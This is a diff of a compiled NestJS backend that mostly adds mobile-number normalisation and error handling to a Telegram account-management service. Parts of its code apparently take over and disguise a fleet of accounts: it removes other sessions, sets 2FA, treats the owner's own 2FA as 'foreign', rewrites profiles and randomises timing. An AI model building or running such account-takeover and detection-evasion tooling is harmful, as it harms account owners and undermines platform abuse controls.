 ], SearchClientDto.prototype, "name", void 0);
 __decorate([
     (0, swagger_1.ApiPropertyOptional)({ description: 'Mobile number' }),
-    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
+    (0, class_transformer_1.Transform)(({ value }) => typeof value === 'string' ? (0, mobile_utils_1.normalizeMobileInput)(value) : value),
     (0, class_validator_1.IsOptional)(),
-    (0, class_validator_1.Matches)(/^\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' }),
+    (0, class_validator_1.Matches)(mobile_utils_1.CANONICAL_MOBILE_REGEX, { message: 'mobile must include country code and contain 11-15 digits' }),
     __metadata("design:type", String)
 ], SearchClientDto.prototype, "mobile", void 0);
 __decorate([
@@ -22546,6 +22657,7 @@ exports.SetupClientQueryDto = void 0;
 const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
 const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
 const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
+const mobile_utils_1 = __webpack_require__(/*! ../../shared/mobile-utils */ "./src/components/shared/mobile-utils.ts");
 const toBoolean = ({ value }) => value === 'true' || value === true;
 class SetupClientQueryDto {
     constructor() {
@@ -22572,7 +22684,9 @@ __decorate([
 __decorate([
     (0, swagger_1.ApiPropertyOptional)({ description: 'Specific mobile to use as replacement' }),
     (0, class_validator_1.IsOptional)(),
+    (0, class_transformer_1.Transform)(({ value }) => typeof value === 'string' ? (0, mobile_utils_1.normalizeMobileInput)(value) : value),
     (0, class_validator_1.IsString)(),
+    (0, class_validator_1.Matches)(mobile_utils_1.CANONICAL_MOBILE_REGEX, { message: 'mobile must include country code and contain 11-15 digits' }),
     __metadata("design:type", String)
 ], SetupClientQueryDto.prototype, "mobile", void 0);
 __decorate([
@@ -22665,6 +22779,7 @@ Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.ClientSchema = exports.Client = void 0;
 const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
 const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
+const mobile_utils_1 = __webpack_require__(/*! ../../shared/mobile-utils */ "./src/components/shared/mobile-utils.ts");
 let Client = class Client {
 };
 exports.Client = Client;
@@ -22690,7 +22805,7 @@ __decorate([
 ], Client.prototype, "name", void 0);
 __decorate([
     (0, swagger_1.ApiProperty)({ description: 'Mobile number' }),
-    (0, mongoose_1.Prop)({ required: true, unique: true }),
+    (0, mongoose_1.Prop)({ required: true, unique: true, set: mobile_utils_1.canonicalizeMobile }),
     __metadata("design:type", String)
 ], Client.prototype, "mobile", void 0);
 __decorate([
@@ -25335,8 +25450,10 @@ var __metadata = (this && this.__metadata) || function (k, v) {
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.CreatePromoteClientDto = void 0;
 const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
+const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
 const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
 const base_client_service_1 = __webpack_require__(/*! ../../shared/base-client.service */ "./src/components/shared/base-client.service.ts");
+const mobile_utils_1 = __webpack_require__(/*! ../../shared/mobile-utils */ "./src/components/shared/mobile-utils.ts");
 class CreatePromoteClientDto {
 }
 exports.CreatePromoteClientDto = CreatePromoteClientDto;
@@ -25351,7 +25468,9 @@ __decorate([
     (0, swagger_1.ApiProperty)({
         description: 'Mobile number of the client'
     }),
+    (0, class_transformer_1.Transform)(({ value }) => typeof value === 'string' ? (0, mobile_utils_1.normalizeMobileInput)(value) : value),
     (0, class_validator_1.IsString)(),
+    (0, class_validator_1.Matches)(mobile_utils_1.CANONICAL_MOBILE_REGEX, { message: 'mobile must include country code and contain 11-15 digits' }),
     __metadata("design:type", String)
 ], CreatePromoteClientDto.prototype, "mobile", void 0);
 __decorate([
@@ -25475,6 +25594,7 @@ const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
 const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
 const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
 const base_client_service_1 = __webpack_require__(/*! ../../shared/base-client.service */ "./src/components/shared/base-client.service.ts");
+const mobile_utils_1 = __webpack_require__(/*! ../../shared/mobile-utils */ "./src/components/shared/mobile-utils.ts");
 class SearchPromoteClientDto {
 }
 exports.SearchPromoteClientDto = SearchPromoteClientDto;
@@ -25491,7 +25611,9 @@ __decorate([
         description: 'Mobile number of the promote client.'
     }),
     (0, class_validator_1.IsOptional)(),
+    (0, class_transformer_1.Transform)(({ value }) => typeof value === 'string' ? (0, mobile_utils_1.normalizeMobileInput)(value) : value),
     (0, class_validator_1.IsString)(),
+    (0, class_validator_1.Matches)(mobile_utils_1.CANONICAL_MOBILE_REGEX, { message: 'mobile must include country code and contain 11-15 digits' }),
     __metadata("design:type", String)
 ], SearchPromoteClientDto.prototype, "mobile", void 0);
 __decorate([
@@ -26404,8 +26526,8 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
                     assignment.assignedBio != null);
                 if (hasAnyAssignment) {
                     const fullUser = await telegramClient.client.invoke(new telegram_1.Api.users.GetFullUser({ id: new telegram_1.Api.InputUserSelf() }));
-                    const currentLastName = fullUser?.users?.[0]?.lastName || '';
-                    const currentBio = fullUser?.fullUser?.about || '';
+                    const currentLastName = this.readNestedString(fullUser, ['users', 0, 'lastName']);
+                    const currentBio = this.readNestedString(fullUser, ['fullUser', 'about']);
                     const firstNameWrong = assignment?.assignedFirstName != null
                         && !(0, homoglyph_normalizer_1.nameMatchesAssignment)(me.firstName || '', assignment.assignedFirstName);
                     const lastNameWrong = assignment?.assignedLastName != null
@@ -26455,7 +26577,7 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
             });
             if ((0, isPermanentError_1.default)(errorDetails)) {
                 const reason = await this.buildPermanentAccountReason(errorDetails.message, telegramClient);
-                await this.markAsInactive(doc.mobile, reason);
+                await this.deactivateClient(doc.mobile, reason);
             }
             return 0;
         }
@@ -26488,7 +26610,7 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
             });
             if ((0, isPermanentError_1.default)(errorDetails)) {
                 const reason = await this.buildPermanentAccountReason(errorDetails.message, telegramClient);
-                await this.markAsInactive(doc.mobile, reason);
+                await this.deactivateClient(doc.mobile, reason);
             }
             return 0;
         }
@@ -26497,8 +26619,10 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
         }
     }
     async create(promoteClient) {
+        const canonicalMobile = this.canonicalMobile(promoteClient.mobile);
         const promoteClientData = {
             ...promoteClient,
+            mobile: canonicalMobile,
             status: promoteClient.status || 'active',
             message: promoteClient.message || 'Account is functioning properly',
         };
@@ -26507,7 +26631,7 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
         await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, [
             '<b>Promote Client Created</b>',
             '',
-            `<b>Mobile:</b> ${promoteClient.mobile}`,
+            `<b>Mobile:</b> ${canonicalMobile}`,
             `<b>Client ID:</b> ${promoteClient.clientId || '-'}`,
             `<b>Status:</b> ${result.status}`,
             `<b>Available Date:</b> ${promoteClient.availableDate || '-'}`,
@@ -26521,18 +26645,29 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
         return this.promoteClientModel.find(filter).exec();
     }
     async findOne(mobile, throwErr = true) {
-        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();
+        const canonicalMobile = this.canonicalMobile(mobile);
+        const user = (await this.promoteClientModel.findOne({ mobile: canonicalMobile }).exec())?.toJSON() || null;
         if (!user && throwErr) {
             throw new common_1.NotFoundException(`PromoteClient with mobile ${mobile} not found`);
         }
         return user;
     }
     async existsByMobile(mobile) {
-        return !!(await this.promoteClientModel.findOne({ mobile }, { _id: 1 }).lean().exec());
+        const canonicalMobile = this.canonicalMobile(mobile);
+        return !!(await this.promoteClientModel.findOne({ mobile: canonicalMobile }, { _id: 1 }).lean().exec());
     }
     async update(mobile, updateClientDto) {
+        const canonicalMobile = this.canonicalMobile(mobile);
+        const updateData = { ...updateClientDto };
+        if (updateData.mobile !== undefined) {
+            const payloadMobile = this.canonicalMobile(updateData.mobile);
+            if (payloadMobile !== canonicalMobile) {
+                throw new common_1.BadRequestException('mobile in payload must match route mobile');
+            }
+            updateData.mobile = canonicalMobile;
+        }
         const updatedUser = await this.promoteClientModel
-            .findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, returnDocument: 'after' })
+            .findOneAndUpdate({ mobile: canonicalMobile }, { $set: updateData }, { new: true, returnDocument: 'after' })
             .exec();
         if (!updatedUser) {
             throw new common_1.NotFoundException(`PromoteClient with mobile ${mobile} not found`);
@@ -26546,8 +26681,18 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
         if (status === 'inactive') {
             updateData.inUse = false;
         }
-        await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>Promote Client Status Update</b>\n\n<b>Mobile:</b> ${mobile}\n<b>New Status:</b> ${status}\n<b>Reason:</b> ${message || '-'}`, { parseMode: 'HTML' });
-        return this.update(mobile, updateData);
+        try {
+            const updated = await this.update(mobile, updateData);
+            this.logger.log(`Promote client ${mobile} status updated to ${status}`);
+            this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>Promote Client Status Update</b>\n\n<b>Mobile:</b> ${mobile}\n<b>New Status:</b> ${status}\n<b>Reason:</b> ${message || '-'}`, { parseMode: 'HTML' }).catch((error) => this.logger.error(`Failed to send promote status success notification for ${mobile}: ${error instanceof Error ? error.message : String(error)}`));
+            return updated;
+        }
+        catch (error) {
+            const errorMessage = error instanceof Error ? error.message : String(error);
+            this.logger.error(`Failed to update promote client ${mobile} status to ${status}: ${errorMessage}`);
+            this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>Promote Client Status Update Failed</b>\n\n<b>Mobile:</b> ${mobile}\n<b>Attempted Status:</b> ${status}\n<b>Reason:</b> ${message || '-'}\n<b>Error:</b> ${errorMessage}`, { parseMode: 'HTML' }).catch((notifyError) => this.logger.error(`Failed to send promote status failure notification for ${mobile}: ${notifyError instanceof Error ? notifyError.message : String(notifyError)}`));
+            throw error;
+        }
     }
     async refillJoinQueue(clientId) {
         if (this.isJoinChannelProcessing || this.isLeaveChannelProcessing)
@@ -26595,7 +26740,7 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
                 const errorDetails = (0, parseError_1.parseError)(error, `RefillJoinQueueErr: ${doc.mobile}`);
                 if ((0, isPermanentError_1.default)(errorDetails)) {
                     const reason = await this.buildPermanentAccountReason(errorDetails.message);
-                    await this.markAsInactive(doc.mobile, reason);
+                    await this.deactivateClient(doc.mobile, reason);
                 }
             }
             finally {
@@ -26636,12 +26781,16 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
         return this.updateStatus(mobile, 'active', message);
     }
     async createOrUpdate(mobile, createOrUpdateUserDto) {
-        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();
-        if (existingUser) {
-            return this.update(existingUser.mobile, createOrUpdateUserDto);
+        const canonicalMobile = this.canonicalMobile(mobile);
+        if (await this.existsByMobile(canonicalMobile)) {
+            const updateDto = {
+                ...createOrUpdateUserDto,
+                mobile: canonicalMobile,
+            };
+            return this.update(canonicalMobile, updateDto);
         }
         else {
-            return this.create(createOrUpdateUserDto);
+            return this.create({ ...createOrUpdateUserDto, mobile: canonicalMobile });
         }
     }
     async remove(mobile, message) {
@@ -26661,7 +26810,10 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
     }
     async search(filter) {
         const query = { ...filter };
-        const regexFields = ['mobile', 'clientId'];
+        if (typeof query.mobile === 'string' && query.mobile) {
+            query.mobile = this.canonicalMobile(query.mobile);
+        }
+        const regexFields = ['clientId'];
         for (const field of regexFields) {
             if (typeof query[field] === 'string' && query[field]) {
                 query[field] = { $regex: new RegExp(query[field].replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'i') };
@@ -26690,15 +26842,16 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
         }
     }
     async setAsPromoteClient(mobile, clientId, availableDate = client_helper_utils_1.ClientHelperUtils.getTodayDateString()) {
-        const user = (await this.usersService.search({ mobile, expired: false }))[0];
+        const canonicalMobile = this.canonicalMobile(mobile);
+        const user = (await this.usersService.search({ mobile: canonicalMobile, expired: false }))[0];
         if (!user)
             throw new common_1.BadRequestException('User not found');
-        const isExist = await this.findOne(mobile, false);
+        const isExist = await this.findOne(canonicalMobile, false);
         if (isExist)
             throw new common_1.ConflictException('PromoteClient already exists');
         const clients = await this.clientService.findAll();
         const clientMobiles = clients.map((client) => client?.mobile);
-        if (clientMobiles.includes(mobile))
+        if (clientMobiles.some((clientMobile) => this.mobilesMatch(clientMobile, canonicalMobile)))
             throw new common_1.BadRequestException('Number is an Active Client');
         let targetClientId = clientId;
         if (!targetClientId && clients.length > 0) {
@@ -26706,7 +26859,7 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
                 { $match: { clientId: { $exists: true, $ne: null }, status: 'active' } },
                 { $group: { _id: '$clientId', count: { $sum: 1 } } },
             ]);
-            const countMap = new Map(counts.map((c) => [c._id, c.count]));
+            const countMap = new Map(counts.map((count) => [count._id, count.count]));
             let minCount = Infinity;
             for (const c of clients) {
                 const count = countMap.get(c.clientId) || 0;
@@ -26716,13 +26869,13 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
                 }
             }
         }
-        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false });
+        const telegramClient = await connection_manager_1.connectionManager.getClient(canonicalMobile, { autoDisconnect: false });
         try {
-            const channels = await this.telegramService.getChannelInfo(mobile, true);
+            const channels = await this.telegramService.getChannelInfo(canonicalMobile, true);
             const promoteClient = {
                 tgId: user.tgId,
                 lastActive: 'default',
-                mobile: user.mobile,
+                mobile: canonicalMobile,
                 session: user.session,
                 availableDate,
                 channels: channels.ids.length,
@@ -26732,7 +26885,7 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
                 lastUsed: null,
             };
             await this.promoteClientModel
-                .findOneAndUpdate({ mobile: user.mobile }, {
+                .findOneAndUpdate({ mobile: canonicalMobile }, {
                 $set: {
                     ...promoteClient,
                     warmupPhase: base_client_service_1.WarmupPhase.ENROLLED,
@@ -26753,7 +26906,7 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
             throw new common_1.HttpException(errorDetails.message, errorDetails.status);
         }
         finally {
-            await this.safeUnregisterClient(mobile);
+            await this.safeUnregisterClient(canonicalMobile);
         }
         return 'Client enrolled as promote successfully';
     }
@@ -26831,7 +26984,7 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
                     if ((0, isPermanentError_1.default)(errorDetails)) {
                         await (0, Helpers_1.sleep)(1000);
                         const reason = await this.buildPermanentAccountReason(errorDetails.message);
-                        await this.markAsInactive(mobile, reason);
+                        await this.deactivateClient(mobile, reason);
                     }
                 }
                 finally {
@@ -26960,8 +27113,8 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
             const warmupPhase = promoteClient.warmupPhase || base_client_service_1.WarmupPhase.ENROLLED;
             if (warmupPhase === base_client_service_1.WarmupPhase.SESSION_ROTATED) {
                 const lastChecked = promoteClient.lastChecked ? new Date(promoteClient.lastChecked).getTime() : 0;
-                const healthCheckPassed = await this.performHealthCheck(promoteClient.mobile, lastChecked, now);
-                if (!healthCheckPassed)
+                const healthCheck = await this.performHealthCheck(promoteClient.mobile, lastChecked, now);
+                if (!healthCheck.passed)
                     continue;
             }
             const processResult = await this.processClient(promoteClient, client);
@@ -27026,9 +27179,9 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
     }
     async isMobileEnrolledAnywhere(mobile) {
         const [promoteExists, bufferExists, clientExists] = await Promise.all([
-            this.promoteClientModel.findOne({ mobile }, { _id: 1 }).lean().exec(),
+            this.existsByMobile(mobile),
             this.bufferClientService.existsByMobile(mobile),
-            this.clientService.findAll().then((clients) => clients.some((c) => c.mobile === mobile)),
+            this.clientService.findAll().then((clients) => clients.some((c) => this.mobilesMatch(c.mobile, mobile))),
         ]);
         if (promoteExists)
             return 'promoteClients';
@@ -27054,12 +27207,16 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
             const channels = await (0, channelinfo_1.channelInfo)(telegramClient.client, true);
             await (0, Helpers_1.sleep)(client_helper_utils_1.ClientHelperUtils.gaussianRandom(7500, 1250, 5000, 10000));
             const user = (await this.usersService.search({ mobile: document.mobile }))[0];
+            if (!user?.session?.trim()) {
+                this.logger.warn(`Skipping promote enrollment for ${document.mobile}: source user/session missing`);
+                return false;
+            }
             const targetAvailableDate = availableDate || client_helper_utils_1.ClientHelperUtils.getTodayDateString();
             const promoteClient = {
                 tgId: document.tgId,
                 lastActive: new Date().toISOString(),
                 mobile: document.mobile,
-                session: user?.session || '',
+                session: user.session,
                 availableDate: targetAvailableDate,
                 channels: channels.ids.length,
                 clientId: targetClientId,
@@ -27091,10 +27248,7 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService e
         catch (error) {
             const errorDetails = this.handleError(error, 'Error processing client', document.mobile);
             if ((0, isPermanentError_1.default)(errorDetails)) {
-                try {
-                    await this.markAsInactive(document.mobile, errorDetails.message);
-                }
-                catch { }
+                await this.deactivateClient(document.mobile, errorDetails.message);
                 try {
                     await this.usersService.update(document.tgId, { expired: true });
                 }
@@ -27358,6 +27512,7 @@ Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.PromoteClientSchema = exports.PromoteClient = void 0;
 const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
 const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
+const mobile_utils_1 = __webpack_require__(/*! ../../shared/mobile-utils */ "./src/components/shared/mobile-utils.ts");
 let PromoteClient = class PromoteClient {
 };
 exports.PromoteClient = PromoteClient;
@@ -27368,7 +27523,7 @@ __decorate([
 ], PromoteClient.prototype, "tgId", void 0);
 __decorate([
     (0, swagger_1.ApiProperty)({ description: 'Unique mobile number for the Telegram account.' }),
-    (0, mongoose_1.Prop)({ required: true, unique: true }),
+    (0, mongoose_1.Prop)({ required: true, unique: true, set: mobile_utils_1.canonicalizeMobile }),
     __metadata("design:type", String)
 ], PromoteClient.prototype, "mobile", void 0);
 __decorate([
@@ -30335,10 +30490,14 @@ Object.defineProperty(exports, "getWarmupPhaseAction", ({ enumerable: true, get:
 Object.defineProperty(exports, "WarmupPhase", ({ enumerable: true, get: function () { return warmup_phases_1.WarmupPhase; } }));
 Object.defineProperty(exports, "isAccountReady", ({ enumerable: true, get: function () { return warmup_phases_1.isAccountReady; } }));
 Object.defineProperty(exports, "isAccountWarmingUp", ({ enumerable: true, get: function () { return warmup_phases_1.isAccountWarmingUp; } }));
+const mobile_utils_1 = __webpack_require__(/*! ./mobile-utils */ "./src/components/shared/mobile-utils.ts");
 exports.ClientStatus = {
     ACTIVE: 'active',
     INACTIVE: 'inactive',
 };
+function isRecord(value) {
+    return typeof value === 'object' && value !== null && !Array.isArray(value);
+}
 class BaseClientService {
     resetDailyJoinCountersIfNeeded() {
         const today = client_helper_utils_1.ClientHelperUtils.getTodayDateString();
@@ -30381,8 +30540,8 @@ class BaseClientService {
             return false;
         return now - lastAttemptTs < this.getEffectiveCooldownMs(mobile, lastAttemptTs);
     }
-    inferWarmupPhaseFromProgress(doc) {
-        if (doc.warmupPhase)
+    inferWarmupPhaseFromProgress(doc, useStoredPhase = true) {
+        if (useStoredPhase && doc.warmupPhase)
             return doc.warmupPhase;
         if (doc.sessionRotatedAt)
             return warmup_phases_1.WarmupPhase.SESSION_ROTATED;
@@ -30415,10 +30574,34 @@ class BaseClientService {
         if (currentRank < this.getWarmupPhaseRank(warmup_phases_1.WarmupPhase.IDENTITY)) {
             return null;
         }
+        const privacyDone = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.privacyUpdatedAt) > 0;
         const twoFADone = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.twoFASetAt) > 0;
         const authsRemoved = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.otherAuthsRemovedAt) > 0;
-        if (twoFADone && !authsRemoved) {
-            return { phase: warmup_phases_1.WarmupPhase.SETTLING, missing: ['otherAuthsRemovedAt'] };
+        const missingSecurity = [];
+        if (!privacyDone)
+            missingSecurity.push('privacyUpdatedAt');
+        if (!twoFADone)
+            missingSecurity.push('twoFASetAt');
+        if (!authsRemoved)
+            missingSecurity.push('otherAuthsRemovedAt');
+        if (missingSecurity.length > 0) {
+            return { phase: warmup_phases_1.WarmupPhase.SETTLING, missing: missingSecurity };
+        }
+        if (currentRank >= this.getWarmupPhaseRank(warmup_phases_1.WarmupPhase.GROWING)) {
+            const identityMissing = [];
+            if (client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.profilePicsDeletedAt) <= 0)
+                identityMissing.push('profilePicsDeletedAt');
+            if (client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.nameBioUpdatedAt) <= 0)
+                identityMissing.push('nameBioUpdatedAt');
+            if (client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.usernameUpdatedAt) <= 0)
+                identityMissing.push('usernameUpdatedAt');
+            if (identityMissing.length > 0) {
+                return { phase: warmup_phases_1.WarmupPhase.IDENTITY, missing: identityMissing };
+            }
+        }
+        if (currentRank >= this.getWarmupPhaseRank(warmup_phases_1.WarmupPhase.READY) &&
+            client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.profilePicsUpdatedAt) <= 0) {
+            return { phase: warmup_phases_1.WarmupPhase.MATURING, missing: ['profilePicsUpdatedAt'] };
         }
         return null;
     }
@@ -30437,10 +30620,7 @@ class BaseClientService {
     }
     async repairWarmupMetadata(doc, now) {
         const updateData = {};
-        const savedPhase = doc.warmupPhase;
-        doc.warmupPhase = undefined;
-        const inferredPhase = this.inferWarmupPhaseFromProgress(doc);
-        doc.warmupPhase = savedPhase;
+        const inferredPhase = this.inferWarmupPhaseFromProgress(doc, false);
         const currentPhaseRank = this.getWarmupPhaseRank(doc.warmupPhase);
         const inferredPhaseRank = this.getWarmupPhaseRank(inferredPhase);
         const missingPrerequisite = this.getMissingPrerequisitePhase(doc);
@@ -30552,6 +30732,29 @@ class BaseClientService {
         const contextWithMobile = mobile ? `${context}: ${mobile}` : context;
         return (0, parseError_1.parseError)(error, contextWithMobile, false);
     }
+    canonicalMobile(mobile) {
+        try {
+            return (0, mobile_utils_1.canonicalizeMobile)(mobile);
+        }
+        catch (error) {
+            const message = error instanceof Error ? error.message : String(error);
+            throw new common_1.BadRequestException(message);
+        }
+    }
+    mobilesMatch(a, b) {
+        return (0, mobile_utils_1.mobilesEqual)(a, b);
+    }
+    async deactivateClient(mobile, reason) {
+        try {
+            await this.updateStatus(mobile, 'inactive', reason);
+            return true;
+        }
+        catch (error) {
+            const errorMessage = error instanceof Error ? error.message : String(error);
+            this.logger.error(`Failed to deactivate ${this.clientType} client ${mobile}: ${errorMessage}`);
+            return false;
+        }
+    }
     async updateUser2FAStatus(tgId, mobile) {
         try {
             await this.usersService.update(tgId, { twoFA: true });
@@ -30560,8 +30763,37 @@ class BaseClientService {
             this.logger.warn(`Failed to update user 2FA status for ${mobile}:`, userUpdateError);
         }
     }
+    readNestedString(root, path) {
+        let current = root;
+        for (const segment of path) {
+            if (typeof segment === 'number') {
+                if (!Array.isArray(current))
+                    return '';
+                current = current[segment];
+                continue;
+            }
+            if (!isRecord(current))
+                return '';
+            current = current[segment];
+        }
+        return typeof current === 'string' ? current : '';
+    }
+    getErrorText(error) {
+        if (error instanceof Error)
+            return error.message;
+        if (isRecord(error)) {
+            const errorMessage = error.errorMessage;
+            if (typeof errorMessage === 'string')
+                return errorMessage;
+            const message = error.message;
+            if (typeof message === 'string')
+                return message;
+        }
+        return String(error);
+    }
     isFrozenError(errorDetails) {
-        const message = `${errorDetails?.message || ''} ${errorDetails?.error?.message || ''} ${errorDetails?.error?.errorMessage || ''}`.toLowerCase();
+        const nestedErrorMessage = this.getErrorText(errorDetails.error || '');
+        const message = `${errorDetails?.message || ''} ${nestedErrorMessage}`.toLowerCase();
         return message.includes('frozen_method_invalid') || message.includes('frozen_participant_missing');
     }
     extractConfigValue(node, targetKey) {
@@ -30575,7 +30807,7 @@ class BaseClientService {
             }
             return undefined;
         }
-        if (typeof node !== 'object')
+        if (!isRecord(node))
             return undefined;
         if (node.key === targetKey && 'value' in node) {
             return node.value;
@@ -30599,12 +30831,14 @@ class BaseClientService {
             const freezeSince = this.extractConfigValue(appConfig, 'freeze_since_date');
             const freezeUntil = this.extractConfigValue(appConfig, 'freeze_until_date');
             const freezeAppealUrl = this.extractConfigValue(appConfig, 'freeze_appeal_url');
+            const freezeSinceNumber = typeof freezeSince === 'number' || typeof freezeSince === 'string' ? Number(freezeSince) : NaN;
+            const freezeUntilNumber = typeof freezeUntil === 'number' || typeof freezeUntil === 'string' ? Number(freezeUntil) : NaN;
             const extras = [];
-            if (freezeSince)
-                extras.push(`freeze_since=${new Date(Number(freezeSince) * 1000).toISOString()}`);
-            if (freezeUntil)
-                extras.push(`freeze_until=${new Date(Number(freezeUntil) * 1000).toISOString()}`);
-            if (freezeAppealUrl)
+            if (Number.isFinite(freezeSinceNumber))
+                extras.push(`freeze_since=${new Date(freezeSinceNumber * 1000).toISOString()}`);
+            if (Number.isFinite(freezeUntilNumber))
+                extras.push(`freeze_until=${new Date(freezeUntilNumber * 1000).toISOString()}`);
+            if (typeof freezeAppealUrl === 'string' && freezeAppealUrl)
                 extras.push(`appeal_url=${freezeAppealUrl}`);
             return extras.length > 0 ? `${baseReason} (${extras.join(', ')})` : baseReason;
         }
@@ -30679,7 +30913,7 @@ class BaseClientService {
         const healthCheckIntervalDays = client_helper_utils_1.ClientHelperUtils.gaussianRandom(7, 1.5, 4, 10);
         const needsHealthCheck = !lastChecked || (now - lastChecked > healthCheckIntervalDays * this.ONE_DAY_MS);
         if (!needsHealthCheck) {
-            return true;
+            return { passed: true, performed: false };
         }
         let telegramClient = null;
         try {
@@ -30696,17 +30930,17 @@ class BaseClientService {
             });
             this.logger.debug(`Health check passed for ${mobile}`);
             await (0, Helpers_1.sleep)(5000);
-            return true;
+            return { passed: true, performed: true };
         }
         catch (error) {
             const errorDetails = this.handleError(error, 'Health check failed', mobile);
             this.logger.warn(`Health check failed for ${mobile}: ${errorDetails.message}`);
             if ((0, isPermanentError_1.default)(errorDetails)) {
                 const reason = await this.buildPermanentAccountReason(`Health check failed: ${errorDetails.message}`, telegramClient);
-                await this.markAsInactive(mobile, reason);
+                await this.deactivateClient(mobile, reason);
             }
             await (0, Helpers_1.sleep)(5000);
-            return false;
+            return { passed: false, performed: true };
         }
         finally {
             await connection_manager_1.connectionManager.unregisterClient(mobile);
@@ -30737,7 +30971,7 @@ class BaseClientService {
             });
             if ((0, isPermanentError_1.default)(errorDetails)) {
                 const reason = await this.buildPermanentAccountReason(errorDetails.message, telegramClient);
-                await this.markAsInactive(doc.mobile, reason);
+                await this.deactivateClient(doc.mobile, reason);
             }
             return 0;
         }
@@ -30776,7 +31010,7 @@ class BaseClientService {
             });
             if ((0, isPermanentError_1.default)(errorDetails)) {
                 const reason = await this.buildPermanentAccountReason(errorDetails.message, telegramClient);
-                await this.markAsInactive(doc.mobile, reason);
+                await this.deactivateClient(doc.mobile, reason);
             }
             return 0;
         }
@@ -30894,7 +31128,7 @@ class BaseClientService {
             });
             if ((0, isPermanentError_1.default)(errorDetails)) {
                 const reason = await this.buildPermanentAccountReason(errorDetails.message, telegramClient);
-                await this.markAsInactive(doc.mobile, reason);
+                await this.deactivateClient(doc.mobile, reason);
             }
             return 0;
         }
@@ -30912,7 +31146,7 @@ class BaseClientService {
             return 'ours';
         }
         catch (error) {
-            const msg = (error?.message || error?.errorMessage || '').toLowerCase();
+            const msg = this.getErrorText(error).toLowerCase();
             if (msg.includes('password_hash_invalid')) {
                 this.logger.warn(`${mobile}: 2FA password verification failed — foreign password`);
                 return 'foreign';
@@ -30942,8 +31176,8 @@ class BaseClientService {
                 }
                 else if (verificationStatus === 'foreign') {
                     this.logger.error(`${doc.mobile} has FOREIGN 2FA password — cannot control this account safely`);
-                    await this.markAsInactive(doc.mobile, 'Foreign 2FA password — account unrecoverable if session dies');
-                    this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>FOREIGN 2FA</b>\n\n<b>Type:</b> ${this.clientType}\n<b>Mobile:</b> ${doc.mobile}\n<b>Phase:</b> ${doc.warmupPhase || 'unknown'}\n<b>Status:</b> Account has unknown 2FA password — marked inactive`, { parseMode: 'HTML' });
+                    const deactivated = await this.deactivateClient(doc.mobile, 'Foreign 2FA password — account unrecoverable if session dies');
+                    this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>FOREIGN 2FA</b>\n\n<b>Type:</b> ${this.clientType}\n<b>Mobile:</b> ${doc.mobile}\n<b>Phase:</b> ${doc.warmupPhase || 'unknown'}\n<b>Status:</b> Account has unknown 2FA password — ${deactivated ? 'marked inactive' : 'inactive update failed'}`, { parseMode: 'HTML' });
                     return 0;
                 }
                 throw new Error('2FA password verification was inconclusive; will retry with normal warmup backoff');
@@ -30970,7 +31204,7 @@ class BaseClientService {
             });
             if ((0, isPermanentError_1.default)(errorDetails)) {
